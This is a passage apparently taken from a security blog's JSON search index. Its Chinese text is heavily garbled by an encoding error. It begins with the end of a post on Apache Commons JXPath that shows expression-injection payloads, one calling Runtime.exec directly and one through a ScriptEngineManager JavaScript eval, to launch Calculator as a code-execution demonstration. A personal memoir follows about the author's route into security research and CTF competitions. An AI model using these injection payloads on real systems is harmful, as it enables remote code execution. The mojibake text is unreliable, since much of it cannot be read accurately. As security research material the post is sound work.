æƒ³è¦æ›´å¤šï¼Ÿæ‹¿ç€tabbyç¼–è¯‘æ‰«ä¸€ä¸‹å°±è¡Œï¼Œæ¯•ç«Ÿåœ¨è¿™é‡Œæˆ‘ä»¬è§„åˆ™å¾ˆç®€å•æ„é€ å‡½æ•°ã€é™æ€æ–¹æ³•ï¼Œåªæ˜¯ç­›é€‰å¯èƒ½ä¼šè´¹ç‚¹æ—¶é—´ç½¢äº† çªç ´é™åˆ¶â€‹ å¯¹äºå¤§å¤šæ•°äººæ¥è¯´ï¼Œå…¶å®æƒ³åˆ°ä¸Šé¢å‡ ç‚¹å°±å·²ç»å¾ˆä¸é”™äº†ï¼Œä½†æ˜¯è€ƒè™‘çš„ä¹Ÿä¸å¤Ÿå…¨é¢ã€‚æ¯•ç«Ÿé¢å‘å®˜æ–¹featureå­¦ä¹ ï¼Œä¸‹ä¸ªæ–­ç‚¹ï¼Œéšä¾¿ç‚¹ç‚¹ï¼Œä¹Ÿç¡®å®å·®ä¸å¤šäº†ã€‚ â€‹ å¯¹æˆ‘ä»¬æ¥è¯´è™½ç„¶ç”¨spirngå¼€å‘çš„é¡¹ç›®å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¸ä¸€å®šèƒ½é‡åˆ°springçš„ç¯å¢ƒï¼Œä¹Ÿä¸ä¸€å®šæœ‰jdbcå¯ä»¥æ‰“ã€‚ â€‹ è€Œå¯¹äºJXpathæ¥è¯´ï¼Œè™½ç„¶è®¾è®¡çš„åƒè¡¨è¾¾å¼ï¼Œä½†å®ƒå´ä¸åƒå…¶ä»–è¡¨è¾¾å¼å¼•æ“é‚£èˆ¬çµæ´»ï¼Œæ”¯æŒéšæ„èµ‹å€¼ç„¶åè°ƒç”¨ã€‚ä¹Ÿä¸èƒ½å¤šæ¡è¯­å¥æ‰§è¡Œï¼Œå®ƒä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€æ¡ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿäº‹å®ä¸Šå¦‚æœä½ ä»”ç»†çœ‹äº†æœ€åä¸€ä¸ªdemoä½ ä¼šå‘ç°æœ‰ä¸ªé•¿è¿™æ ·çš„ 12String firstName = (String)context.getValue(&quot;getAuthorsFirstName($book)&quot;);//As you can see, the target of the method is specified as the first parameter of the function. ä»è‹±æ–‡æ¥çœ‹å…¶å®å°±æ˜¯$book.getAuthorsFirstName()ï¼Œå°±æ˜¯è¿™ä¹ˆçš„ç®€å•ã€‚ç¨å¾®ä¼šç‚¹Javaçš„ä½ å¯èƒ½ä¹Ÿè¯¥æƒ³åˆ° å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰§è¡ŒRuntime.getRuntime().exec(&quot;open -na Calculator&quot;)ï¼ŒæŒ‰ç…§ä¸Šé¢çš„ä¾‹å­å…¶å®å°±æ”¹ä¸ºäº†exec(java.lang.Runtime.getRuntime(),&#39;open -na Calculator&#39;) åˆæˆ–è€…æˆ‘ä»¬åˆ©ç”¨ScriptEngineManagerè°ƒç”¨jså®ç°rce eval(getEngineByName(javax.script.ScriptEngineManager.new(),&#39;js&#39;),&#39;java.lang.Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)&#39;) æ–¹æ³•ä¹Ÿä¾¿å¤šäº†èµ·æ¥ï¼Œæœ‰æ—¶å€™å¤šå¾€ä¸‹é¢çœ‹çœ‹ï¼ŒçœŸçš„å¯ä»¥èŠ‚çº¦å¾ˆå¤šæ—¶é—´ï¼Œä¸ç„¶å°±éœ€è¦ä»”ç»†çœ‹çœ‹å­—ç¬¦ä¸²çš„è§£ææµç¨‹ï¼Œå±å®æ— è¶£ã€‚","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache Commons Jxpath","slug":"Apache-Commons-Jxpath","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Jxpath/"}]},{"title":"ä¸´è¡Œéšç¬”","slug":"year/2022/7/ä¸´è¡Œéšç¬”","date":"2022-07-09T15:40:31.000Z","updated":"2024-08-04T09:01:49.689Z","comments":true,"path":"2022/07/09/year/2022/7/ä¸´è¡Œéšç¬”/","link":"","permalink":"https://y4tacker.github.io/2022/07/09/year/2022/7/%E4%B8%B4%E8%A1%8C%E9%9A%8F%E7%AC%94/","excerpt":"","text":"ä¸´è¡Œéšç¬”ä¸´èµ°äº†ï¼Œç®€å•è°ˆè°ˆæˆ‘çš„æ„Ÿå—ï¼Œæœ€è¿‘å‡ å¹´å¸¦ç»™æˆ‘çš„æˆé•¿æ— ç–‘æ˜¯å·¨å¤§çš„ï¼Œä»ä»€ä¹ˆæ—¶å€™å¼€å§‹æ„Ÿè§‰è‡ªå·±çœŸæ­£æˆé•¿å‘¢ï¼Ÿå…¶å®æœ‰å‡ ä¸ªç¬é—´ï¼Œä¸€æ˜¯æˆ‘èƒ½æ”¾å¼ƒç°å®è¿½é€ç†æƒ³ï¼ŒäºŒæ˜¯æˆ‘å‘ç°æˆ‘çš„è¡¨è¾¾æ¬²æ­£åœ¨é€æ¸æ¶ˆå¤±(èƒ½æ…¢æ…¢ä¸“æ³¨äºæé«˜è‡ªå·±)ï¼Œä¸‰æ˜¯æ‹¥æœ‰ä¸€é¢—å¹³æ·¡çš„å¿ƒï¼Œå…³äºè¿™ç‚¹ä¹‹åä¼šæ…¢æ…¢è¯´æ¥ æ­£å¼è¿›å…¥å·å¤§å‰æˆ‘è¯»äº†ä¸€å¹´é¢„ç§‘ï¼Œè¿™ä¸€å¹´å…¶å®ç»™æˆ‘å¸¦æ¥äº†å¾ˆå¤šï¼Œä»é«˜ä¸­å¿ƒé‡Œçš„é˜´éœ¾èµ°äº†å‡ºæ¥(ç°åœ¨ä¸€ç›´è§‰å¾—é«˜ä¸­é‚£ä¼šå„¿æˆ‘å¾ˆå‚»ï¼Œä»é˜³å…‰åˆ°å­¤ç‹¬)ï¼Œåˆ°äº†å¤§å­¦æ–°çš„ç¯å¢ƒæˆ‘çŠ¹å¦‚æ–°ç”Ÿä¸€èˆ¬ï¼Œæ…¢æ…¢å¼€å§‹æ¥çº³æ–°çš„äº‹ç‰©ï¼Œæœ¬æ¥èµ°å‘é˜´éƒçš„å¿ƒå¼€å§‹æ‰“å¼€ï¼Œè¿™ä¸€å¹´é‡Œæˆ‘èœ•å˜äº†å¾ˆå¤šï¼Œä½“é‡ä»144é™ä½åˆ°120ä»¥ä¸‹ï¼Œé‡æ–°å˜å¾—çˆ±ç¬‘ï¼Œå˜å¾—å–œæ¬¢åœ¨äººå‰è¡¨ç°è‡ªå·±ï¼Œè¿™ä¸€å¹´å½“ä¸­æˆ‘æ„Ÿè§‰åˆ°æˆ‘æ´»å‡ºäº†è‡ªå·±ï¼Œè¿™æ˜¯æœ€æœ‰æ„ä¹‰çš„ä¸€åˆ»ï¼Œä½†å…¶å®æˆ‘çŸ¥é“è¿™ä¸€åˆ‡éƒ½æ˜¯å¥èº«ç»™æˆ‘å¸¦æ¥çš„ï¼Œæ¯å¤©ä¸‰å°æ—¶çš„è®­ç»ƒè®©æˆ‘å­¦ä¼šäº†å¿è€ï¼Œå­¦ä¼šäº†ä»˜å‡ºï¼Œè¿™ä¸€å¹´é‡Œæˆ‘å¾ˆå¼€å¿ƒï¼Œä¹Ÿå¾ˆä¼¤å¿ƒï¼Œæˆ‘å¾ˆå¼€å§‹æ˜¯å› ä¸ºæˆ‘å‘ç°æˆ‘ç”¨å¿ƒå¯¹å¾…å‘¨å›´çš„åŒå­¦ï¼Œå¸®ä»–ä»¬è§£å†³ä»–ä»¬çš„é—®é¢˜ï¼Œæˆ‘å¾ˆä¼¤å¿ƒæ˜¯å› ä¸ºä»–ä»¬è¯´æˆ‘æ˜¯è€å¸ˆçš„èˆ”ç‹—ï¼Œæˆ‘é‚£æ—¶å°±åœ¨æƒ³ï¼Œæˆ‘ä¸æ±‚æˆç»©ï¼Œä¸æ±‚å›æŠ¥ï¼Œåªæ˜¯ä¸€å‘³çš„å–œæ¬¢è¡¨ç°è‡ªå·±å¸®åŠ©ä»–äººï¼Œè™½ç„¶é‚£æ—¶å€™æˆ‘å¯èƒ½çœŸçš„æœ‰äº›åœ°æ–¹ä¸å¤ªä¼šè¯´è¯(è¿™æ¥è‡ªäºæˆ‘æœ¬èƒ½çš„è‚†æ— å¿Œæƒ®)ï¼Œç‰¹åˆ«æ˜¯æœ€åç”±äºé¢„ç§‘æœ€åéœ€è¦ç»¼åˆæˆç»©é€‰ä¸“ä¸šï¼Œæˆ‘é‚£æ—¶å€™ç¬¬ä¸€æ¬¡æ„Ÿè§‰åˆ°ä¸ºä»€ä¹ˆæ˜æ˜å°±æ˜¯å­¦ç”Ÿï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¿™ä¹ˆåŠ¿åŠ›ï¼Œä¸ºä»€ä¹ˆå¯ä»¥æ— ç¼˜æ— æ•…å–·äººï¼Œåœ¨é‚£æ—¶å€™æˆ‘æ‰å‘ç°åŸæ¥è¿™é‡Œä¸å†æ˜¯é«˜ä¸­ï¼Œæ— äººç®¡æ§äººæ€§åœ¨é‡Šæ”¾ï¼Œè¿˜è®°å¾—åœ¨æœ€åä¸€æ¬¡å¬è€å¸ˆå®‰æ’ä¸‹å¸®å¥³åŒå­¦ä»¬æ¬å®Œå®¿èˆï¼Œé‚£æ—¶å€™æˆ‘ç»ˆäºæ§åˆ¶ä¸ä½äº†ï¼Œæˆ‘åœ¨å¥³ç”Ÿå®¿èˆä¸‹çš„é•¿å‡³ä¸Šå“­çš„å¾ˆä¼¤å¿ƒï¼Œä¼¤å¿ƒçœŸå¿ƒä»˜å‡ºè¢«ä¼¤å®³ï¼Œä¼¤å¿ƒåˆ«äººçš„ä¸ç†è§£ï¼Œå…¶å®æˆ‘çŸ¥é“åœ¨é‚£ä¸€åˆ»å¼€å§‹æˆ‘æ…¢æ…¢å˜å¾—ä¸å†çƒ­å¿ƒï¼Œä½†é‚£æ—¶å€™çš„æˆ‘å¯æ²¡æ„è¯†åˆ° é‚£æ—¶å€™è¿˜ä¸é”™ç»¼åˆæ’åå‰å‡ åï¼Œé€‰åˆ°äº†è‡ªå·±æƒ³é€‰æ‹©çš„ç½‘å®‰ï¼Œè‡³äºä¸ºä»€ä¹ˆé€‰æ‹©è¿™ä¸ªä¸“ä¸šç†ç”±å¾ˆç®€å•ï¼Œæˆ‘ä»æ¥ä¸æ˜¯å› ä¸ºé’±é€‰æ‹©æˆä¸ºä¸€åé»‘å®¢ï¼Œå°æ—¶å€™è¿˜è®°å¾—åˆä¸­å°±çœ‹ç€ç½‘ä¸Šé‚£äº›é»‘å®¢çš„æ•…äº‹å¾ˆé…·ï¼Œä½†è‡ªå·±æ²¡æœ‰è€å¸ˆæ‰¾ä¸åˆ°æ•™ç¨‹(ä¸ä¼šæœç´¢å¼•æ“)ï¼Œä½†é‚£æ—¶å€™æˆ‘å´é˜´å·®é˜³é”™å­¦äº†ä¸€äº›æ˜“è¯­è¨€ï¼Œä¼šä¸€ç‚¹ç®€å•çš„ç¼–ç¨‹åšè¿‡ä¸€äº›å¥½ç©çš„å°è½¯ä»¶ï¼Œå–œæ¬¢çç‚¹å®¶é‡Œçš„ç”µè„‘ï¼Œè®°å¾—é‚£æ—¶å€™æŒ–åˆ°ä¸€ä¸ªæ¼æ´(é‚£æ—¶å€™è¿˜æ²¡æ„è¯†åˆ°è¿™å°±æ˜¯é»‘å®¢)ï¼Œæ˜¯ä¸€ä¸ªæœé¢˜è½¯ä»¶çš„ï¼Œæœ¬æ¥é æ¯å¤©ç­¾åˆ°å›ç­”é—®é¢˜æ‰èƒ½è·å¾—å¯¥å¯¥æ— å‡ çš„é‡‘å¸ï¼Œä½†æˆ‘é€šè¿‡æ¥å£æ³„æ¼æˆåŠŸå¾—åˆ°å‡ äº¿é‡‘å¸ï¼Œåœ¨é‚£ä¸€å¤©æˆ‘ç–¯ç‹‚çš„çœ‹åˆ«äººçš„ä»˜è´¹å¸–å­å¼€å¿ƒçš„åƒä¸ªå‚»å­ï¼Œä½†ä¹Ÿæ­¢æ­¥äºæ­¤äº†ï¼Œåº”è¯•æ•™è‚²è®©æˆ‘ä¸å¾—ä¸æ”¾å¼ƒå¹¶ä¸”é‚£æ—¶å€™ä¹Ÿä»æ²¡è®¤è¯†åˆ°è¿™ä¼šæ˜¯æœªæ¥çš„ä¸€ä¸ªèŒä¸šï¼Œé«˜ä¸­é«˜è€ƒå‰æ— èŠä¹Ÿå­¦äº†ä¸€äº›cè¯­è¨€ï¼Œè¿˜è®°å¾—åˆ«äººåœ¨å¤ä¹ è€Œæˆ‘åœ¨çº¸ä¸Šæ‰‹å†™ä»£ç çš„æ—¥å­ï¼Œè™½ç„¶åªæœ‰çŸ­çŸ­å‡ å¤©ï¼ŒåŸå› ä¹Ÿæ˜¯å› ä¸ºä¹¦ç±å†™çš„æ™¦æ¶©éš¾æ‡‚åŠ ä¸Šæˆ‘æ²¡æœ‰ç¼–ç¨‹çš„æ€æƒ³ åˆ°äº†ç½‘å®‰ä¸“ä¸šï¼Œå¤§ä¸€é‚£ä¸€å¹´ï¼Œæˆ‘ä»ç„¶è¿·èŒ«ï¼Œæˆ‘åªçŸ¥é“æˆ‘è¦ä¸Šå¥½æ¯ä¸€å ‚è¯¾ï¼Œä½†æ˜¯è¶Šå­¦è¶Šè¿·èŒ«ï¼Œäºæ˜¯æˆ‘æ‹¼äº†å‘½çš„å»å­¦ä¹ è¯¾è¡¨ä¸Šçš„é«˜æ•°ï¼Œçº¿æ€§ä»£æ•°ï¼Œè¿˜æœ‰ä¸€äº›é€šè¯†è¯¾ç¨‹ï¼Œä½†æˆ‘ä¸å¿«ä¹ï¼Œæˆ‘èƒ½æ·±æ·±æ„Ÿå—åˆ°çœŸæ­£å¿«ä¹çš„æ—¶å€™æ˜¯æˆ‘åœ¨cè¯­è¨€è¯¾å ‚ä¸Šæˆ‘å¦‚ç—´å¦‚é†‰çš„å¬ç€è€å¸ˆè®²ç€æˆ‘ä¸ä¼šçš„ä¸œè¥¿ï¼Œè¿˜åœ¨è¯¾ä¸‹é€šè¿‡ç½‘ä¸Šçš„ä¾‹å­å­¦ä¼šäº†é£æœºå¤§æˆ˜è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€ä¸ªå­¦ä¹ çš„æ¸¸æˆï¼Œå½“ç„¶ä¹Ÿæ˜¯æœ€åä¸€ä¸ªæ¸¸æˆï¼Œæˆ‘è¿˜çƒ­çˆ±è®¡ç®—æœºç³»ç»Ÿå¯¼è®ºè¯¾ç¨‹ï¼ŒåŸå› åˆ™åªæ˜¯å› ä¸ºå¤ªè¿‡ç®€å•ï¼Œåˆ«äººæ‹¼äº†å‘½çš„å­¦ä¹ ä¹Ÿä¸å¦‚æˆ‘è¯¾é¢˜æ‘¸é±¼çš„æˆæœï¼Œè€Œæˆ‘çŸ¥é“è¿™äº›å¾—ç›Šäºæˆ‘å°æ—¶å€™å–œæ¬¢å–œæ¬¢æŠ˜è…¾ç”µè„‘æœ‰å…³ï¼Œä¹Ÿåªæœ‰è¿™ä¸¤èŠ‚è¯¾è®©æˆ‘æ„Ÿå—åˆ°äº†æˆ‘åœ¨å­¦ä¹ è®¡ç®—æœºï¼Œå“¦å¯¹äº†ï¼Œè¿˜æœ‰CTFæ–°ç”Ÿèµ›è™½ç„¶è¢«æš´æ‰“ä½†æ˜¯é¢˜ç›®ä¹Ÿä¸æ˜¯ç‰¹åˆ«éš¾ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦åˆ°äº†ä¸€ä¸çš„å®‰å…¨ï¼Œå¯æ˜¯ä¹Ÿåªæ˜¯ä»…é™äºä¸€äº›ç®€å•çš„F12ï¼ŒF5,burpsuiteï¼Œhackbar? çœŸæ­£è®©æˆ‘å¼€å§‹äº§ç”Ÿè„±å˜çš„æ—¶å€™è¿˜æ˜¯å¤§ä¸€ä¸‹ï¼Œç”±äºç–«æƒ…æˆ‘åªèƒ½å‘†åœ¨å®¶é‡Œï¼Œç”±äºç½‘è¯¾çš„æ— èŠæˆ‘å¼€å§‹å­¦ä¹ pythonï¼Œå¼€å§‹èµ°å‘å¼€å‘(å…¶å®æ˜¯çˆ¬è™«)ï¼Œæˆ‘å†™äº†åŠå¹´çš„çˆ¬è™«å­¦ä¼šäº†æ•°æ®åˆ†æï¼Œå­¦ä¼šäº†æ­£åˆ™åŒ¹é…ï¼Œå­¦ä¼šäº†åšä¸€äº›è¯äº‘å›¾ï¼Œä¹Ÿå­¦ä¼šäº†ä¸€äº›ç®€å•çš„åçˆ¬æœºåˆ¶çš„ç»•è¿‡ï¼Œè¿™å­¦æœŸæˆ‘è¿˜å› ä¸ºé»„è€å¸ˆçš„è¯¾å­¦ä¼šäº†é¢å‘å¯¹è±¡çš„å¼€å‘ï¼Œç¬¬ä¸€æ¬¡å…¥æ‰‹Javaå¼€å‘ï¼Œä¸ä»…ç”¨pythonå®ç°äº†å¾ˆå¤šä¾¿æ·çš„è„šæœ¬ï¼ŒåŒæ—¶åˆè½¬åŒ–ä¸ºJavaï¼Œè¿˜å­¦ä¼šäº†Java webï¼Œç‰¹åˆ«æ˜¯è¯¾ç¨‹ä¸Šå†™ä¸€å †å±ä¸€æ ·çš„ä»£ç ä½†å®ç°äº†æœ€ç»ˆçš„åŠŸèƒ½çš„é‚£æ®µæ—¶é—´é‡Œæˆ‘å¾ˆå¼€å¿ƒï¼Œå¼€å¿ƒæˆ‘èƒ½å­¦ä»¥è‡´ç”¨ï¼Œä¹Ÿå¾ˆå¼€å¿ƒé€šè¿‡åŠå¹´çš„å¼€å‘å­¦ä¹ ï¼Œè‡³å°‘å› ä¸ºè¿™äº›åŸºç¡€æˆ‘æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºçš„é¢˜æˆ‘èƒ½ç‹¬ç«‹å®Œæˆï¼Œé«˜æ‰‹åŒºä¹Ÿèƒ½åšä¸€ä¸¤é“ï¼Œä½†æˆ‘åˆå¾ˆä¼¤å¿ƒï¼Œä¼¤å¿ƒåœ¨äºæˆ‘åœ¨å­¦é«˜æ•°ï¼Œåœ¨å­¦å¤§å­¦ç‰©ç†ï¼Œä¸€æ ·çš„è¿·èŒ«ï¼Œæˆ‘ä¹°äº†æœ¬ç²¾ç®€ç‰ˆçš„å‰ç±³å¤šç»´å¥‡çš„ä¹¦åˆ·é¢˜åˆ·æˆ‘çš„é«˜æ•°ï¼Œåˆ·æˆ‘çš„æ¦‚ç‡ç»Ÿè®¡ï¼Œæˆ‘åƒç–¯äº†ä¸€æ ·çš„æŠŠåšåšçš„ä¸¤æœ¬ä¹¦éƒ½åšäº†ä¸€ä¸¤éï¼Œä½†è¶Šåšæˆ‘è¶Šè¿·èŒ«ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘çœ‹åˆ°æˆ‘é«˜æ•°æˆç»©98åˆ†ï¼Œå½“æˆ‘å¾—çŸ¥æˆ‘ç»¼åˆæ’åç¬¬ä¸‰çš„é‚£ä¸€åˆ»æˆ‘æ›´æ…Œäº†ï¼Œä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºæˆ‘ä¸çŸ¥é“è¿™ä¸€å¹´å†…æˆ‘å­¦ä¼šäº†ä»€ä¹ˆï¼Ÿæˆ‘å¥½åƒä»€ä¹ˆéƒ½å­¦äº†ï¼Œä½†æ˜¯æˆ‘å¥½åƒåˆä»€ä¹ˆéƒ½ä¸ä¼šï¼Œæˆ‘åªçŸ¥é“æˆ‘ä¼šé«˜æ•°ï¼Œæˆ‘æ•°å­¦å¾ˆç‰›é€¼ï¼ä½†æˆ‘ä¼¼ä¹ä¸å¤ªä¼šç½‘ç»œå®‰å…¨ï¼Œå½“æ—¶æˆ‘åœ¨å¥½å…„å¼Ÿçš„å¯å®¤åšäº†ä¸€ä¸ªé‡å¤§çš„å†³å®šï¼Œæˆ‘å±è‚¡ååœ¨ä»–çš„æ»‘æ¿ä¸Šå°±åœ¨å¯å®¤å½“ä¸­å¾€å‰æ»‘åˆå¾€åæ»‘ï¼Œæœ€åæˆ‘æŒ£æ‰äº†å¾ˆä¹…æ”¾å¼ƒä¿ç ”çš„è·¯ï¼Œä¸ºä»€ä¹ˆä¼šæŒ£æ‰ï¼Ÿå› ä¸ºæˆ‘æˆç»©å¤ªå¥½äº†ï¼Œæˆ‘å…¶å®å¾ˆèˆä¸å¾—æˆ‘é‚£ä¸ªåæ¬¡ï¼Ÿä½†æˆ‘æ„è¯†åˆ°é‚£ä¸æ˜¯æˆ‘æ‰€çƒ­çˆ±çš„ å°±è¿™æ ·åˆ°äº†å¤§äºŒï¼Œæˆ‘å¼€å§‹ç–¯ç‹‚æ¶è¡¥ç½‘å®‰çš„çŸ¥è¯†çœ‹ç€ç½‘ç»œä¸Šå„ä¸ªå‰è¾ˆå‘çš„è§†é¢‘ï¼Œæˆ‘å¾ˆè¿‡ç˜¾OWASP TOP10çš„åŸç†æˆ‘åŸºæœ¬ä¸Šéƒ½æ‡‚äº†ï¼Œè¿™æ—¶å€™ç”±äºæˆ‘çš„åŠªåŠ›è¢«æ ¡é˜Ÿçš„CTFæˆ˜é˜Ÿçœ‹ä¸Šäº†ï¼Œæˆ‘æˆåŠŸè¿›å…¥äº†æ¢¦å¯ä»¥æ±‚çš„æˆ˜é˜Ÿï¼Œåˆç–¯ç‹‚å¼€å§‹åˆ·CTFé¢˜ï¼Œå…ˆæ˜¯ç®€å•çš„æ”»é˜²ä¸–ç•Œçš„é¢˜ï¼Œå¾ˆå¥½é«˜æ‰‹åŒºåšäº†ä¸€é¡µå¾ˆæ»¡è¶³ï¼Œåé¢å¤ªéš¾æˆ‘çœ‹ä¸æ‡‚æ²¡åšäº†ï¼Œåˆå»åˆ·CTFHUBæŠ€èƒ½æ ‘è¿˜æœ‰BUGKUï¼Œåˆ·äº†ä¸¤ä¸‰éå§ï¼Œä¸æ–­é‡å¤ä¸æ–­æ€è€ƒï¼Œä½†æˆ‘è¿˜æ˜¯éš¾å—ï¼Œæ€»è§‰å¾—è¿˜æ˜¯å°‘äº†ç‚¹ä»€ä¹ˆï¼Œåé¢æˆ‘çŸ¥é“äº†æ˜¯é‚£è‚¡æ¿€æƒ…ï¼Œè€Œè¿™è‚¡æ¿€æƒ…æ¥æºäºæˆ‘ç¬¬ä¸€æ¬¡å¿ä¸‹å¿ƒèŠ±äº†99å…ƒä¹°äº†CTFSHOWçš„VIPï¼Œæˆ‘å¾ˆçˆ½ï¼Œæ‹¿ç€ä¸€ä¸ªåˆä¸€ä¸ªçš„ä¸€è¡€ï¼Œæœ€å¼€å¿ƒçš„æ—¶å€™è«è¿‡äºåˆ·äº†ä¸€é¢˜æ‰“å¼€ç¾¤èŠï¼Œé‡Œé¢æ˜¾ç¤ºç€â€œæ­å–œY4tackerè·å¾—xxxåˆ†ç±»xxxé¢˜ä¸€è¡€/äºŒè¡€/ä¸‰è¡€â€ï¼Œå°±è¿™æ ·è¿‡äº†åŠå¹´ï¼Œåˆ°äº†å¤§äºŒä¸Šå°¾å£°é‚£æ®µæ—¶é—´æˆ‘åˆè¿·èŒ«äº†ï¼Œæˆ‘ä¸çŸ¥é“æˆ‘èƒ½åšä»€ä¹ˆï¼Œæ¯”èµ›é¢˜æˆ‘éƒ½ä¸ä¼šå°±ä¼šç‚¹ç®€å•çš„ï¼Œå°±åœ¨å®¶é‡Œéº»æœ¨çš„åšç€CTFSHOWï¼Œåé¢ä¸çŸ¥é“æ€ä¹ˆçš„çªç„¶å¼€çªäº†ï¼ŒAKäº†å¾ˆå¤šæ¯”èµ›ä¹Ÿèµ¢å¾—äº†ä¸€ç‚¹å°åå£°åˆæŠŠæˆ‘æ•‘äº†å›æ¥ï¼Œå¯æ˜¯æ„Ÿå—ç€åˆ«äººçš„å¹æ§ï¼Œæˆ‘åˆé™·å…¥äº†è¿·èŒ«ï¼Œå› ä¸ºè¿™æ—¶å€™æˆ‘åˆ°äº†å¤§äºŒä¸‹ï¼Œå¬å­¦é•¿è¯´åˆ°äº†å¤§ä¸‰å°±è¦å®ä¹ äº†ï¼Œä½†æˆ‘ä¸ä¼šå®æˆ˜ï¼Œæˆ‘åªä¼šåšä¸€äº›é¢˜ï¼Œæˆ‘åˆ°åº•èƒ½å¹²ä»€ä¹ˆï¼Ÿé‚£æ—¶å€™æˆ‘ä¸å¤ªå–œæ¬¢é»‘ç›’å› ä¸ºæˆ‘åŸºç¡€ä¸æ‰å®ï¼Œå› ä¸ºæˆ‘èœï¼Œå› æ­¤æˆ‘é€‰æ‹©äº†ç™½ç›’ï¼Œä»ç¬¬ä¸€æ¬¡æ‰“å¼€PHPä»£ç ï¼Œä¸€è¡Œä¸€è¡Œæœç€æˆ‘ä¸æ‡‚çš„å‡½æ•°ï¼Œåˆ°åé¢æˆ‘èƒ½å®Œæ•´åˆ†æä¸€ä¸ªç®€å•çš„æ¡†æ¶ï¼Œä¸­é€”æ”¶è·äº†å¾ˆå¤šCNVDé€šç”¨ç¼–å·ï¼Œä¹Ÿé€šè¿‡ä¸€ä¸ªæœˆèµšåˆ°äº†CNVDä¸€åƒå¤šå—é’±çš„äº¬ä¸œå¡ç»™å®¶é‡Œä¹°äº†ä¸œè¥¿ï¼Œæˆ‘å¾ˆå¼€å¿ƒï¼Œä½†åé¢æˆ‘æ„è¯†åˆ°æˆ‘åªæœ‰å¾ˆå°ä¸€éƒ¨åˆ†æ¼æ´å±å®³å¾ˆå¤§å…¶ä»–çš„è¯´ç™½äº†å°±æ˜¯åƒåœ¾æ´ï¼Œä»€ä¹ˆååºåˆ—åŒ–é“¾ï¼Œä»€ä¹ˆåå°RCEï¼Œç‰¹åˆ«æ˜¯å½“æ—¶çœ‹åˆ°ä¸€ä¸ªå¸ˆå‚…è¯´ååºåˆ—åŒ–ä¹Ÿç®—æ´ï¼Ÿæˆ‘åˆå¼€å§‹è¿·èŒ«äº†ï¼Œä¸ºäº†é€ƒé¿æˆ‘æ‹‰é»‘äº†é‚£ä½å¸ˆå‚…ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ‹‰é»‘ä¸€ä¸ªäººï¼Œè™½ç„¶æˆ‘çŸ¥é“åšæ³•ä¸å¯¹ï¼Œä½†æˆ‘çœŸçš„å¾ˆéš¾å—ï¼Œåœ¨é‚£æ—¶å€™æˆ‘å¼€å§‹æäº¤CVEï¼Œä½†æ²¡ä»€ä¹ˆæ€è·¯åªæ˜¯æŠŠæˆ‘æœ€å±Œçš„ä¸¤ä¸ªæ´ä»CNVDæ¬åˆ°äº†CVEè€Œå·²ï¼Œä¹Ÿä»…æ­¤è€Œå·²ï¼Œåœ¨è¿™æœŸé—´æˆ‘åˆAKäº†å¾ˆå¤šæ¯”èµ›ï¼Œä½†è¿˜æ˜¯èµ°ä¸å‡ºå¿ƒé‡Œçš„æ€ªåœˆï¼Œå¼€å§‹å˜å¾—å­¤ç‹¬(å› ä¸ºæ‰“æ¯”èµ›å¾ˆå­¤ç‹¬åªæœ‰æˆ‘è‡ªå·±åšä¸€ä¸ªæ–¹å‘)ï¼Œä½†æˆ‘ä¹Ÿå˜å¾—æ›´çˆ±æ€è€ƒ å†åˆ°åæ¥å›½èµ›ï¼Œå¼ºç½‘æ¯éƒ½æ‹¿åˆ°å¥–åï¼Œæˆ‘åˆè¿·èŒ«äº†ï¼Œè¿™ä¸€æ¬¡æ˜¯å› ä¸ºæˆ‘å¤§ä¸‰äº†ï¼Œçœ¼çœ‹ç€å°±å¿«å‡†å¤‡å®ä¹ äº†æˆ‘å‘ç°æˆ‘å¤ªèœäº†ï¼Œæˆ‘æ—¶å¸¸é—®æˆ‘è‡ªå·±ï¼Œåªä¼šåšç‚¹é¢˜æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿäºæ˜¯æˆ‘å¼€å§‹æ‹“å±•æˆ‘çš„çŸ¥è¯†é¢ï¼Œé˜´å·®é˜³é”™è¿›äº†pç¥çš„ä»£ç å®¡è®¡æ˜Ÿçƒï¼Œå¿ƒé‡Œä»˜æ¬¾çš„æ—¶å€™è¿˜æ˜¯å¾ˆéš¾å—(ä¸ä¹ æƒ¯çŸ¥è¯†ä»˜è´¹ï¼Œå¹³æ—¶éƒ½æ˜¯ç½‘ä¸Šç™½å«–èµ„æ–™)ï¼Œä½†åæ¥è¿›å»ä»¥ååˆè§‰å¾—å¾ˆå€¼å¾—ï¼Œå› ä¸ºæˆ‘ä»è¿™é‡Œå­¦ä¼šäº†ä¸€ç‚¹Javaå®‰å…¨ï¼Œä»ä¸€å¼€å§‹æ‡µæ‡µæ‡‚æ‡‚åˆ°åé¢èƒ½ç»“åˆå®é™…æ€è€ƒæˆ‘æƒ³è¿™æ–¹é¢å¾—ç›Šäºpç‰›æ–‡å­—çš„é­…åŠ›(pç‰›æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é»‘å®¢ï¼Œä»–å–œæ¬¢å»æ€è€ƒå¼€å‘ä¸ºä»€ä¹ˆä¼šè¿™æ ·å†™ï¼Ÿè¿™æ ·å†™çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ)ï¼Œåæ¥ä»æ— 